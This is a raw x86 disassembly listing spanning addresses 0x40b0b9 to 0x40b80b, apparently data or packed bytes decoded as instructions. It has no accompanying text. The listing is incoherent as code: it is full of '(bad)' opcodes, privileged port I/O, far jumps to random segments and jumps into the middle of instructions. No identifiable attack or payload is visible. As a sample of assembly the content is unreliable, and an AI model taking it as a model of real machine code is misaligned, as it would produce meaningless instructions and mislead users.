  40b0b9:	test   DWORD PTR [esi+0xa1f3d84],ebx
  40b0bf:	jb     0x40b0c1
  40b0c1:	inc    ecx
  40b0c2:	ins    BYTE PTR es:[edi],dx
  40b0c3:	scas   eax,DWORD PTR es:[edi]
  40b0c4:	sub    al,0x7
  40b0c6:	sbb    BYTE PTR [edi+0x7f64bbc9],al
  40b0cc:	dec    edx
  40b0cd:	sbb    eax,0xec2739e6
  40b0d2:	and    ecx,ebx
  40b0d4:	fiadd  WORD PTR [ebx+ebx*4+0x2f]
  40b0d8:	cli    
  40b0d9:	adc    al,0x54
  40b0db:	repnz test BYTE PTR [ecx],0x17
  40b0df:	jp     0x40b099
  40b0e1:	pop    esi
  40b0e2:	rep stos DWORD PTR es:[edi],eax
  40b0e4:	pop    es
  40b0e5:	js     0x40b0ed
  40b0e7:	xor    BYTE PTR [edx],dh
  40b0e9:	idiv   BYTE PTR [eax-0x2f87a4a7]
  40b0ef:	in     eax,0xee
  40b0f1:	jle    0x40b082
  40b0f3:	sahf   
  40b0f4:	inc    esp
  40b0f5:	(bad)  
  40b0f7:	sub    al,0x8c
  40b0f9:	mov    edi,0xb2794457
  40b0fe:	out    dx,al
  40b0ff:	dec    eax
  40b100:	xchg   ebp,eax
  40b101:	cmp    ebp,ebx
  40b103:	shr    BYTE PTR [ebx+0x2],0xce
  40b107:	scas   al,BYTE PTR es:[edi]
  40b108:	dec    esi
  40b109:	add    eax,0x31e99bf2
  40b10e:	push   ecx
  40b10f:	ins    DWORD PTR es:[edi],dx
  40b110:	ins    DWORD PTR es:[edi],dx
  40b111:	or     BYTE PTR ds:0x5d09293a,0xe1
  40b118:	push   0xf
  40b11a:	mov    fs,WORD PTR [ebx+0x6e9492c0]
  40b120:	out    0xda,eax
  40b122:	popf   
  40b123:	mov    ch,0x8b
  40b125:	add    BYTE PTR [ebx-0x42707ed3],bl
  40b12b:	xor    BYTE PTR [edi+ecx*4],ch
  40b12e:	cmp    DWORD PTR [eax+0x6fd522a1],eax
  40b134:	jb     0x40b178
  40b136:	xor    cl,BYTE PTR [esi]
  40b138:	ja     0x40b1ae
  40b13a:	mov    dl,bl
  40b13c:	xor    eax,0x679684d0
  40b141:	in     al,dx
  40b142:	mov    cl,0x51
  40b144:	jne    0x40b152
  40b146:	outs   dx,BYTE PTR ds:[esi]
  40b147:	cmp    eax,0x308d7360
  40b14c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b14d:	pop    esp
  40b14e:	mov    dh,BYTE PTR [esi+edx*4+0x496fd0c8]
  40b155:	dec    ebx
  40b156:	(bad)  
  40b159:	adc    al,0x36
  40b15b:	dec    esi
  40b15c:	mov    ?,esp
  40b15e:	sahf   
  40b15f:	fist   WORD PTR [esi+0x5a]
  40b162:	fiadd  DWORD PTR [ebx-0x74]
  40b165:	(bad)  
  40b166:	pop    esp
  40b167:	sti    
  40b168:	pusha  
  40b169:	push   edx
  40b16a:	stos   BYTE PTR es:[edi],al
  40b16b:	or     al,0x39
  40b16d:	(bad)  
  40b16e:	cs adc al,0x44
  40b171:	push   cs
  40b172:	cmp    ebx,ebp
  40b174:	pop    ss
  40b175:	test   BYTE PTR [ecx],bl
  40b177:	xchg   DWORD PTR [eax-0x41],edi
  40b17a:	inc    esi
  40b17b:	jne    0x40b159
  40b17d:	pushf  
  40b17e:	push   eax
  40b17f:	sub    bh,BYTE PTR [esi]
  40b181:	out    0xd4,al
  40b183:	repz add BYTE PTR [ebp+0x3a],bh
  40b187:	adc    DWORD PTR [ecx+0x26],0xffffff94
  40b18b:	add    esp,0x1d
  40b18e:	adc    al,0x61
  40b190:	aaa    
  40b191:	mov    ecx,0x289333ae
  40b196:	add    ecx,ebx
  40b198:	pop    ecx
  40b199:	mov    dh,0x32
  40b19b:	fsub   DWORD PTR [edx-0x2c]
  40b19e:	cmp    DWORD PTR [esi],edx
  40b1a0:	dec    ebx
  40b1a1:	inc    ebx
  40b1a2:	into   
  40b1a3:	add    bl,BYTE PTR [ecx+0x659e9d49]
  40b1a9:	outs   dx,BYTE PTR ds:[esi]
  40b1aa:	fdiv   DWORD PTR [edi+0x78e0e888]
  40b1b0:	lods   al,BYTE PTR ds:[esi]
  40b1b1:	mov    ch,0x80
  40b1b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b1b4:	(bad)  
  40b1b5:	xor    ch,BYTE PTR [ecx]
  40b1b7:	inc    esp
  40b1b8:	pop    ecx
  40b1b9:	out    dx,al
  40b1ba:	jae    0x40b236
  40b1bc:	xchg   ecx,eax
  40b1bd:	cmp    eax,DWORD PTR [edx]
  40b1bf:	cmp    al,ah
  40b1c1:	lods   al,BYTE PTR ds:[esi]
  40b1c2:	sub    al,0xe9
  40b1c4:	inc    edx
  40b1c5:	mov    WORD PTR [edx+edi*4-0x293437e9],ds
  40b1cc:	not    DWORD PTR [esi]
  40b1ce:	jmp    0x40b24d
  40b1d0:	jne    0x40b153
  40b1d2:	lahf   
  40b1d3:	push   eax
  40b1d4:	push   ecx
  40b1d5:	aas    
  40b1d6:	inc    ebp
  40b1d7:	(bad)  
  40b1d8:	jmp    0x4ea2edbc
  40b1dd:	add    eax,0xf4c1b057
  40b1e2:	jne    0x40b25c
  40b1e4:	in     eax,0x7d
  40b1e6:	sbb    edi,DWORD PTR [eax]
  40b1e8:	adc    dh,BYTE PTR [eax+0x75]
  40b1eb:	and    DWORD PTR [edi],0xa6ec514
  40b1f1:	sub    al,0x15
  40b1f3:	mov    bh,0x92
  40b1f5:	mov    ecx,0xcda7be2e
  40b1fa:	in     eax,0xab
  40b1fc:	xor    al,0x93
  40b1fe:	ins    DWORD PTR es:[edi],dx
  40b1ff:	jg     0x40b1ee
  40b201:	jp     0x40b202
  40b203:	outs   dx,BYTE PTR ds:[esi]
  40b204:	std    
  40b205:	mov    eax,ds:0x50a7f078
  40b20a:	rcr    esi,0xc8
  40b20d:	sar    dh,1
  40b20f:	cmp    cl,BYTE PTR [ebp+0x2]
  40b212:	lds    ecx,FWORD PTR [ebp+0x49]
  40b215:	call   0xbb8da6de
  40b21a:	pop    DWORD PTR [ebp+0x1edaf4fb]
  40b220:	fld    st(5)
  40b222:	stc    
  40b223:	repz leave 
  40b225:	mov    eax,ds:0xb7d49be7
  40b22a:	shl    DWORD PTR [ecx+0x42c03613],1
  40b230:	push   ebx
  40b231:	jg     0x40b291
  40b233:	ins    BYTE PTR es:[edi],dx
  40b234:	cmp    DWORD PTR [eax+edx*8-0x4ea88343],esi
  40b23b:	jno    0x40b1ef
  40b23d:	pushf  
  40b23e:	bound  edx,QWORD PTR [eax-0x6b]
  40b241:	or     eax,0x86acf6a4
  40b246:	adc    esi,ecx
  40b248:	cmp    dl,BYTE PTR [eax+0x322c284c]
  40b24e:	(bad)  
  40b24f:	icebp  
  40b250:	mov    dh,0xe3
  40b252:	xchg   esp,eax
  40b253:	out    0x43,eax
  40b255:	mov    ah,0x9
  40b257:	lahf   
  40b258:	jne    0x40b229
  40b25a:	dec    edi
  40b25b:	arpl   WORD PTR [esi-0x3a2feabb],ax
  40b261:	sub    esp,eax
  40b263:	loope  0x40b274
  40b265:	mov    ah,BYTE PTR [edx-0x418a338d]
  40b26b:	adc    cl,bl
  40b26d:	cwde   
  40b26e:	adc    al,0x18
  40b270:	mov    edx,DWORD PTR [eax+0x51]
  40b273:	dec    ebx
  40b274:	pop    ecx
  40b275:	inc    esi
  40b276:	in     al,0xa9
  40b278:	cld    
  40b279:	(bad)  
  40b27a:	xchg   esi,eax
  40b27b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b27c:	pop    edi
  40b27d:	jae    0x40b20f
  40b27f:	stos   BYTE PTR es:[edi],al
  40b280:	cmp    cl,dh
  40b282:	or     dh,BYTE PTR [ebx-0x4c]
  40b285:	test   al,0xdf
  40b287:	jno    0x40b29e
  40b289:	adc    edi,edi
  40b28b:	cmp    eax,0x59949bf3
  40b290:	inc    eax
  40b291:	dec    edi
  40b292:	inc    esi
  40b293:	cs jl  0x40b23b
  40b296:	(bad)  [ebp+0x218bb59e]
  40b29c:	shl    BYTE PTR [ecx],cl
  40b29e:	les    edi,FWORD PTR [ecx]
  40b2a0:	jp     0x40b24d
  40b2a2:	ds adc ch,BYTE PTR fs:[esi-0x56]
  40b2a7:	push   edx
  40b2a8:	or     edi,DWORD PTR [edi+0x41]
  40b2ab:	arpl   WORD PTR [edx+0x7e2095ed],bp
  40b2b1:	cli    
  40b2b2:	stc    
  40b2b3:	pop    edx
  40b2b4:	iret   
  40b2b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2b6:	push   esi
  40b2b7:	xor    eax,DWORD PTR [ebp-0x7b]
  40b2ba:	sub    eax,0x9ade4e56
  40b2bf:	ins    DWORD PTR es:[edi],dx
  40b2c0:	(bad)  
  40b2c1:	clc    
  40b2c2:	jmp    0x40b24f
  40b2c4:	fstp   DWORD PTR [esp+edi*4-0x64]
  40b2c8:	push   cs
  40b2c9:	dec    edx
  40b2ca:	jno    0x40b257
  40b2cc:	xor    eax,DWORD PTR [ecx-0x3807afe8]
  40b2d2:	ins    BYTE PTR es:[edi],dx
  40b2d3:	sub    bl,0x4
  40b2d6:	inc    edi
  40b2d7:	pusha  
  40b2d8:	dec    ecx
  40b2d9:	stos   BYTE PTR es:[edi],al
  40b2da:	mul    DWORD PTR [ecx]
  40b2dc:	aas    
  40b2dd:	rcl    DWORD PTR [ebx+0x63],0x9b
  40b2e1:	lods   al,BYTE PTR ds:[esi]
  40b2e2:	loopne 0x40b2b2
  40b2e4:	clc    
  40b2e5:	jmp    0xee3e:0x344bd2f4
  40b2ec:	arpl   WORD PTR [esi-0x13],di
  40b2ef:	je     0x40b306
  40b2f1:	jmp    0xeda2:0xd0bd7b8e
  40b2f8:	inc    esp
  40b2f9:	neg    DWORD PTR [eax+eax*1-0xd61a6d]
  40b300:	adc    cl,BYTE PTR [eax+edi*1-0x1b55ae39]
  40b307:	adc    DWORD PTR [eax+0x2a],ecx
  40b30a:	jae    0x40b2f1
  40b30c:	pop    edi
  40b30d:	mov    ebp,DWORD PTR [eax+0x6423c5b3]
  40b313:	push   edx
  40b314:	ret    
  40b315:	aaa    
  40b316:	xlat   BYTE PTR ds:[ebx]
  40b317:	pop    ss
  40b318:	and    al,0xe
  40b31a:	cdq    
  40b31b:	and    BYTE PTR [esi],bl
  40b31d:	in     eax,0x8e
  40b31f:	xchg   esi,eax
  40b320:	push   edi
  40b321:	bound  edi,QWORD PTR [ebp+0x45]
  40b324:	ja     0x40b39c
  40b326:	cmp    ah,ch
  40b328:	jb     0x40b333
  40b32a:	jnp    0x40b306
  40b32c:	sbb    BYTE PTR [edx-0x448f2e5b],bh
  40b332:	aam    0x6f
  40b334:	dec    esi
  40b335:	out    dx,eax
  40b336:	fsubr  DWORD PTR [edx]
  40b338:	icebp  
  40b339:	jns    0x40b332
  40b33b:	aaa    
  40b33c:	stc    
  40b33d:	retf   0xb95d
  40b340:	sahf   
  40b341:	inc    esi
  40b342:	push   0xffffffdc
  40b344:	mov    gs:0xcc6a4c12,al
  40b34a:	jb     0x40b2cd
  40b34c:	xor    ecx,DWORD PTR [edi-0x4f1236e]
  40b352:	or     bl,dh
  40b354:	ret    0x8011
  40b357:	enter  0x4ebf,0x61
  40b35b:	push   esp
  40b35c:	pop    ecx
  40b35d:	mov    dh,0x58
  40b35f:	adc    al,0xb9
  40b361:	fidivr WORD PTR [edi+0x1d54a451]
  40b367:	out    0x42,eax
  40b369:	test   eax,0x4c6dee96
  40b36e:	and    eax,0xb15f883e
  40b373:	mov    ebp,0xeef12a0a
  40b378:	ds js  0x40b3bf
  40b37b:	les    eax,FWORD PTR [ecx]
  40b37d:	das    
  40b37e:	sbb    eax,0x7914cbee
  40b383:	adc    DWORD PTR [edi],esi
  40b385:	outs   dx,BYTE PTR ds:[esi]
  40b386:	repz fidivr DWORD PTR [eax+0x4b37a563]
  40b38d:	(bad)  
  40b38e:	or     bh,ah
  40b390:	mov    WORD PTR [edi-0x5813f354],es
  40b396:	mov    ch,0x63
  40b398:	adc    esp,DWORD PTR [edi+0x74]
  40b39b:	sbb    BYTE PTR [ebx+ecx*2],dh
  40b39e:	mov    cs,esi
  40b3a0:	sbb    esp,DWORD PTR [ebx]
  40b3a2:	push   es
  40b3a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3a4:	push   ebp
  40b3a5:	sbb    eax,0xe7b928e8
  40b3aa:	sbb    BYTE PTR [ebx-0x7b],0x83
  40b3ae:	pop    edx
  40b3af:	fst    QWORD PTR [edx-0x78]
  40b3b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3b3:	es cwde 
  40b3b5:	in     al,dx
  40b3b6:	ja     0x40b3e1
  40b3b8:	xor    al,0x9f
  40b3ba:	lahf   
  40b3bb:	pop    ss
  40b3bc:	dec    ecx
  40b3bd:	sbb    esp,DWORD PTR [edx+0x44408ca4]
  40b3c3:	fimul  DWORD PTR ds:0x276c25d4
  40b3c9:	cmp    bl,BYTE PTR [eax]
  40b3cb:	(bad)  
  40b3cc:	and    cl,BYTE PTR [ecx]
  40b3ce:	aad    0xb6
  40b3d0:	xlat   BYTE PTR ds:[ebx]
  40b3d1:	aaa    
  40b3d2:	adc    al,0x17
  40b3d4:	add    eax,0xeadb1f21
  40b3d9:	jae    0x40b442
  40b3db:	pushf  
  40b3dc:	sar    DWORD PTR [esi-0x2139f30f],0x5
  40b3e3:	pop    ebx
  40b3e4:	pop    edi
  40b3e5:	imul   ebx,ebp,0x41
  40b3e8:	xor    al,0x8f
  40b3ea:	fwait
  40b3eb:	push   ecx
  40b3ec:	xor    esp,DWORD PTR [edx+0x7e50b645]
  40b3f2:	add    edi,0xd593e432
  40b3f8:	scas   al,BYTE PTR es:[edi]
  40b3f9:	int    0x50
  40b3fb:	stc    
  40b3fc:	fwait
  40b3fd:	sub    BYTE PTR [edi+0x49f31c6b],bl
  40b403:	xchg   ebx,eax
  40b404:	jb     0x40b45b
  40b406:	push   esp
  40b407:	out    0xbd,al
  40b409:	cmp    bl,dl
  40b40b:	in     al,dx
  40b40c:	scas   al,BYTE PTR es:[edi]
  40b40d:	jge    0x40b3eb
  40b40f:	stos   DWORD PTR es:[edi],eax
  40b410:	lahf   
  40b411:	push   ss
  40b412:	add    al,0xb0
  40b414:	dec    ebp
  40b415:	and    ch,BYTE PTR [edi]
  40b417:	add    al,0xd5
  40b419:	(bad)  
  40b41a:	fs das 
  40b41c:	repnz test al,0x2
  40b41f:	outs   dx,BYTE PTR ds:[esi]
  40b420:	pop    edi
  40b421:	add    DWORD PTR cs:[eax-0x4162275e],0xffffffdf
  40b429:	inc    ebx
  40b42a:	gs mov ecx,0x288a67fc
  40b430:	cmp    al,BYTE PTR [ebp+0x3b0c8c96]
  40b436:	cmp    eax,DWORD PTR [edi-0x6bc8cd89]
  40b43c:	sar    BYTE PTR [ebx],0x81
  40b43f:	mov    al,ds:0x1b285ec5
  40b444:	and    BYTE PTR [edx+0x4d],cl
  40b447:	xor    BYTE PTR [ebx+ebp*4-0x5d],cl
  40b44b:	jb     0x40b4a5
  40b44d:	dec    esi
  40b44e:	and    cl,0x1f
  40b451:	jecxz  0x40b455
  40b453:	push   0x6a
  40b455:	(bad)  
  40b456:	ds dec esp
  40b458:	adc    al,0xd8
  40b45a:	fld    st(7)
  40b45c:	pop    esi
  40b45d:	xor    BYTE PTR [edx],0x8a
  40b460:	fdivr  st(7),st
  40b462:	mov    ebx,DWORD PTR [ecx+0x2a562e83]
  40b468:	jnp    0x40b42c
  40b46a:	or     bl,BYTE PTR [eax-0x55588b1c]
  40b470:	jno    0x40b436
  40b472:	fs js  0x40b41d
  40b475:	sbb    cl,BYTE PTR [ecx]
  40b477:	fs jl  0x40b498
  40b47a:	(bad)  
  40b47b:	(bad)  
  40b47c:	ror    BYTE PTR [ebx],1
  40b47e:	cmp    edx,ebx
  40b480:	xor    eax,0x6e6fa34a
  40b485:	and    ecx,esp
  40b487:	jno    0x40b4cb
  40b489:	pop    ebx
  40b48a:	mov    ecx,0x80536496
  40b48f:	and    ecx,DWORD PTR [eax]
  40b491:	icebp  
  40b492:	sub    BYTE PTR [esi+ebx*8-0x66f8e62c],ah
  40b499:	adc    bh,dh
  40b49b:	adc    al,0xe5
  40b49d:	das    
  40b49e:	rcl    BYTE PTR [ecx-0x5f1d1b40],1
  40b4a4:	test   BYTE PTR [ecx-0x5ded854],dl
  40b4aa:	ins    BYTE PTR es:[edi],dx
  40b4ab:	pushf  
  40b4ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4ad:	pusha  
  40b4ae:	jmp    FWORD PTR [ebp-0x50]
  40b4b1:	ffree  st(7)
  40b4b3:	inc    edi
  40b4b4:	fxch   st(5)
  40b4b6:	push   0x22
  40b4b8:	mov    WORD PTR [eax+0x6dace0de],es
  40b4be:	push   cs
  40b4bf:	cs mov ebp,0x71e3580a
  40b4c5:	call   0xead6:0x82cb1845
  40b4cc:	inc    ecx
  40b4cd:	mov    esi,0x2e4045a8
  40b4d2:	mov    BYTE PTR [ebx],ah
  40b4d4:	push   ecx
  40b4d5:	call   0xbdcd64bc
  40b4da:	jmp    0xcb15:0x1618e626
  40b4e1:	pusha  
  40b4e2:	data16 and bl,BYTE PTR [ecx]
  40b4e5:	mov    al,0x71
  40b4e7:	call   0xe4a1:0xfc793872
  40b4ee:	mov    al,0x6a
  40b4f0:	test   BYTE PTR [eax-0x7ab8501e],dl
  40b4f6:	cmp    ebx,DWORD PTR [edi+0x68c81484]
  40b4fc:	loop   0x40b551
  40b4fe:	xlat   BYTE PTR ds:[ebx]
  40b4ff:	fdiv   QWORD PTR [edi]
  40b501:	or     al,0xa4
  40b503:	aas    
  40b504:	add    eax,0x280c2493
  40b509:	cmp    dh,BYTE PTR [edi-0x84d9c6f]
  40b50f:	sbb    DWORD PTR [esi+0x61],ebx
  40b512:	mov    ds:0x6225528a,al
  40b517:	add    DWORD PTR [edi+0x22],eax
  40b51a:	jg     0x40b51e
  40b51c:	mov    al,0x52
  40b51e:	mov    ebx,0x1850c3bc
  40b523:	inc    ebx
  40b524:	stc    
  40b525:	mov    eax,ds:0x759ccd55
  40b52a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b52b:	jae    0x40b506
  40b52d:	popa   
  40b52e:	rcr    DWORD PTR [esi],0x40
  40b531:	lea    esp,[ebx+edi*8-0x1f5d30aa]
  40b538:	mov    ds:0x1bcd6f79,eax
  40b53d:	cli    
  40b53e:	sahf   
  40b53f:	mov    dh,0x9c
  40b541:	fcomp  QWORD PTR [ebx]
  40b543:	mov    ss,WORD PTR [ebp+0x7e5b2bd1]
  40b549:	sbb    esi,DWORD PTR [ebx+eiz*2+0x24ad67cf]
  40b550:	xchg   esp,eax
  40b551:	stos   BYTE PTR es:[edi],al
  40b552:	cld    
  40b553:	jno    0x40b553
  40b555:	or     bl,al
  40b557:	jl     0x40b522
  40b559:	adc    al,0xee
  40b55b:	and    BYTE PTR [esi-0x2b],dh
  40b55e:	mov    ds:0x5579430,al
  40b563:	iret   
  40b564:	inc    ebx
  40b565:	inc    esi
  40b566:	dec    edx
  40b567:	leave  
  40b568:	dec    ebx
  40b569:	(bad)  
  40b56a:	push   0xe6e83bcf
  40b56f:	or     al,0x65
  40b571:	dec    edi
  40b572:	test   al,0x92
  40b574:	xchg   ebx,eax
  40b575:	pop    ebx
  40b576:	sub    eax,0x3221c2c3
  40b57b:	cmovbe esi,DWORD PTR [edx+0x7077c317]
  40b582:	icebp  
  40b583:	pop    ss
  40b584:	jae    0x40b605
  40b586:	mov    bh,0xf0
  40b588:	pop    ds
  40b589:	(bad)  
  40b58b:	lods   eax,DWORD PTR ds:[esi]
  40b58c:	(bad)  
  40b58d:	not    DWORD PTR [ecx]
  40b58f:	or     DWORD PTR [ebx+0x3c],esi
  40b592:	mov    ds:0x9b907feb,al
  40b597:	cs icebp 
  40b599:	pushf  
  40b59a:	push   0x4d
  40b59c:	fst    DWORD PTR [esi+0x516e3d5d]
  40b5a2:	pop    edi
  40b5a3:	pop    ecx
  40b5a4:	in     al,0xed
  40b5a6:	add    bh,BYTE PTR [esi]
  40b5a8:	loop   0x40b5a0
  40b5aa:	stos   DWORD PTR es:[edi],eax
  40b5ab:	jl     0x40b584
  40b5ad:	(bad)  
  40b5ae:	int3   
  40b5af:	push   ebp
  40b5b0:	inc    ebp
  40b5b1:	into   
  40b5b2:	(bad)  [ebx-0x6f08694d]
  40b5b8:	xor    eax,0xc4f02b07
  40b5bd:	sub    bl,ch
  40b5bf:	lock jg 0x40b5b2
  40b5c2:	mov    al,0xfc
  40b5c4:	cmp    DWORD PTR [ecx+0x46],0xffffffa6
  40b5c8:	imul   eax,edi,0xffffff9f
  40b5cb:	mov    ecx,0x5f7c04d7
  40b5d0:	jmpw   0xb5a2
  40b5d4:	or     DWORD PTR [ebx+0x2f16ca4],0xffffffd8
  40b5db:	jmp    0xbc5cdb03
  40b5e0:	outs   dx,BYTE PTR ds:[esi]
  40b5e1:	sub    DWORD PTR [ebp-0x3652774b],edx
  40b5e7:	push   ebp
  40b5e8:	out    0x67,eax
  40b5ea:	shl    BYTE PTR [edx],1
  40b5ec:	xchg   BYTE PTR [ebp-0x52],cl
  40b5ef:	ins    DWORD PTR es:[edi],dx
  40b5f0:	and    ah,dl
  40b5f2:	mov    bl,dh
  40b5f4:	sbb    eax,0x73082f9d
  40b5f9:	sbb    BYTE PTR [eax],al
  40b5fb:	(bad)  
  40b5fc:	sti    
  40b5fd:	sub    al,0x7a
  40b5ff:	adc    al,0x43
  40b601:	mov    eax,ds:0xdfa18eab
  40b606:	jp     0x40b5ca
  40b608:	mov    bh,0x2b
  40b60a:	cs repz mov ebx,0xa26e7865
  40b611:	jl     0x40b63b
  40b613:	jmp    0x40b5ab
  40b615:	enter  0xd644,0x25
  40b619:	je     0x40b631
  40b61b:	iret   
  40b61c:	in     eax,dx
  40b61d:	sbb    ebp,DWORD PTR [eax+0x2e7837f0]
  40b623:	xor    al,0xfc
  40b625:	mov    dh,0x0
  40b627:	mov    dh,0x40
  40b629:	and    al,0xd1
  40b62b:	sti    
  40b62c:	popa   
  40b62d:	out    0xc7,al
  40b62f:	add    ecx,DWORD PTR [edi-0x24]
  40b632:	cmp    al,0xd5
  40b634:	add    bh,dh
  40b636:	sbb    al,0xb0
  40b638:	fmul   DWORD PTR [edi-0x3f6aa24b]
  40b63e:	or     esi,DWORD PTR [edi-0x50fe46f]
  40b644:	add    DWORD PTR [esi+0x55],edx
  40b647:	inc    edx
  40b648:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b649:	les    ebx,FWORD PTR [ecx+esi*4]
  40b64c:	shl    DWORD PTR [ecx-0x24],0x43
  40b650:	popf   
  40b651:	aad    0x95
  40b653:	cmp    cl,BYTE PTR [esp+eax*4+0x4d33e2f7]
  40b65a:	add    ah,cl
  40b65c:	gs xchg edi,eax
  40b65e:	jns    0x40b66a
  40b660:	sar    BYTE PTR cs:[ebx+0x528a7b2f],cl
  40b667:	not    bh
  40b669:	jmp    0x324d:0x386e4d2b
  40b670:	fild   QWORD PTR [ebx+0x42]
  40b673:	frndint 
  40b675:	mov    dh,BYTE PTR [ebp-0x2b]
  40b678:	pop    ebx
  40b679:	rcr    dh,0x6d
  40b67c:	les    ebx,FWORD PTR [edi]
  40b67e:	mov    edi,0xdba7a2a4
  40b683:	mov    esi,0xc8e5a791
  40b688:	jne    0x40b698
  40b68a:	in     al,0xe6
  40b68c:	std    
  40b68d:	push   esi
  40b68e:	dec    eax
  40b68f:	das    
  40b690:	dec    eax
  40b691:	mov    ch,0x44
  40b693:	inc    edi
  40b694:	xor    ecx,DWORD PTR [ebx+0x6a]
  40b697:	pushf  
  40b698:	inc    esi
  40b699:	sbb    DWORD PTR [ebp+0x4c3f469a],esi
  40b69f:	fld    TBYTE PTR [eax+edx*8]
  40b6a2:	push   cs
  40b6a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6a4:	fcomp  DWORD PTR [edx]
  40b6a6:	ror    BYTE PTR [ebx+0x47],cl
  40b6a9:	popa   
  40b6aa:	scas   al,BYTE PTR es:[edi]
  40b6ab:	fisub  DWORD PTR [ebp-0xa4947ff]
  40b6b1:	arpl   WORD PTR [eax+edi*1-0x12],cx
  40b6b5:	jg     0x40b6be
  40b6b7:	out    dx,al
  40b6b8:	fstp   DWORD PTR [ebp-0x4ab5fc40]
  40b6be:	pop    ds
  40b6bf:	mov    BYTE PTR ds:0x470a9311,dl
  40b6c5:	mov    ah,0x4c
  40b6c7:	cmp    eax,0x42365738
  40b6cc:	rol    DWORD PTR [ecx+0x7c5797c8],cl
  40b6d2:	sbb    edi,DWORD PTR [esp+edi*4]
  40b6d5:	es pop edi
  40b6d7:	fldcw  WORD PTR [esi-0x18662fe4]
  40b6dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6de:	(bad)  
  40b6df:	or     BYTE PTR [ecx-0x29],dh
  40b6e2:	add    ah,BYTE PTR [edi]
  40b6e4:	pop    ebp
  40b6e5:	pop    ebp
  40b6e6:	xchg   ebx,eax
  40b6e7:	xchg   ebp,eax
  40b6e8:	sbb    cl,ah
  40b6ea:	jae    0x40b6a2
  40b6ec:	and    BYTE PTR ds:0x16e5b3c2,cl
  40b6f2:	ficomp WORD PTR [ecx]
  40b6f4:	mov    ebp,0x48693f4a
  40b6f9:	cmp    DWORD PTR [ebx+0x322f71fe],0xb02d295c
  40b703:	jae    0x40b6c7
  40b705:	imul   edx,DWORD PTR [edi+0x50676482],0xffffffe2
  40b70c:	and    BYTE PTR [edx],dl
  40b70e:	ss scas al,BYTE PTR es:[edi]
  40b710:	call   0x5b10:0x5bacc946
  40b717:	mov    ch,0x2
  40b719:	in     al,0x53
  40b71b:	clc    
  40b71c:	js     0x40b772
  40b71e:	addr16 sbb al,0x1a
  40b721:	mov    al,0x8a
  40b723:	add    eax,0x4462c77c
  40b728:	xor    eax,0x3aba9bce
  40b72d:	jnp    0x40b781
  40b72f:	and    al,0xe3
  40b731:	xchg   esp,eax
  40b732:	outs   dx,DWORD PTR ds:[esi]
  40b733:	xlat   BYTE PTR ds:[ebx]
  40b734:	jp     0x40b735
  40b736:	aad    0x60
  40b738:	mov    bh,0x58
  40b73a:	imul   ebp,DWORD PTR [eax],0xffffff8c
  40b73d:	fimul  WORD PTR [edx]
  40b73f:	xchg   DWORD PTR [ebp+esi*8+0x34],ecx
  40b743:	cmp    BYTE PTR [ecx+0x53],bl
  40b746:	call   0x53a96083
  40b74b:	cli    
  40b74c:	mov    eax,ds:0x32afe7f7
  40b751:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b752:	push   cs
  40b753:	ret    
  40b754:	mov    eax,0xaf882b63
  40b759:	mov    eax,0xcad4edce
  40b75e:	mov    ch,0xe5
  40b760:	jbe    0x40b77e
  40b762:	pop    ss
  40b763:	push   esi
  40b764:	mov    ds:0xfc6f8b73,eax
  40b769:	cmp    ecx,esi
  40b76b:	or     eax,0xe1b5f4a1
  40b770:	and    ah,cl
  40b772:	sub    ah,BYTE PTR [ebx]
  40b774:	mov    WORD PTR [ebp-0x17],fs
  40b777:	or     ecx,ebx
  40b779:	jp     0x40b76e
  40b77b:	ds push 0xf734fc9a
  40b781:	jb     0x40b7f2
  40b783:	sahf   
  40b784:	mov    dh,BYTE PTR ds:0xfef1d2b1
  40b78a:	(bad)  
  40b78b:	push   esi
  40b78c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b78d:	xchg   ebx,eax
  40b78e:	repz add al,0x30
  40b791:	jp     0x40b7f0
  40b793:	and    BYTE PTR [edx-0x31f336d8],ch
  40b799:	cld    
  40b79a:	inc    esi
  40b79b:	mov    esi,DWORD PTR [edi-0x6e]
  40b79e:	popa   
  40b79f:	sub    al,0xda
  40b7a1:	add    cl,BYTE PTR [edi+edx*4-0x23]
  40b7a5:	outs   dx,DWORD PTR ds:[esi]
  40b7a6:	fistp  DWORD PTR [ecx+0x1364609]
  40b7ac:	xor    eax,0x4b79136
  40b7b1:	pop    edi
  40b7b2:	push   0x142ed732
  40b7b7:	out    0xfd,al
  40b7b9:	and    al,0x92
  40b7bb:	cwde   
  40b7bc:	pop    edi
  40b7bd:	mov    bl,BYTE PTR [edx+0x112c806e]
  40b7c3:	in     al,dx
  40b7c4:	pusha  
  40b7c5:	or     al,0xe7
  40b7c7:	push   ss
  40b7c8:	(bad)
  40b7cd:	(bad)  [esi-0x299ae416]
  40b7d4:	jg     0x40b7e5
  40b7d6:	clc    
  40b7d7:	adc    al,0x7c
  40b7d9:	(bad)  
  40b7da:	outs   dx,DWORD PTR ds:[esi]
  40b7db:	test   eax,0x17d415bf
  40b7e0:	add    cx,WORD PTR [eax+0x1e7bf08a]
  40b7e7:	mov    gs,esp
  40b7e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7ea:	(bad)  
  40b7eb:	lods   eax,DWORD PTR ds:[esi]
  40b7ec:	iret   
  40b7ed:	lahf   
  40b7ee:	and    DWORD PTR [ecx+0xc],edi
  40b7f1:	push   ecx
  40b7f2:	dec    edx
  40b7f3:	mov    dh,0x5d
  40b7f5:	dec    edx
  40b7f6:	jne    0x40b790
  40b7f8:	jns    0x40b837
  40b7fa:	aas    
  40b7fb:	mov    WORD PTR [eax],fs
  40b7fd:	js     0x40b859
  40b7ff:	shl    DWORD PTR [edx],0x4c
  40b802:	mov    BYTE PTR [ebx-0x44],ah
  40b805:	imul   esp,esi,0x7096c02d
  40b80b:	mov    al,al
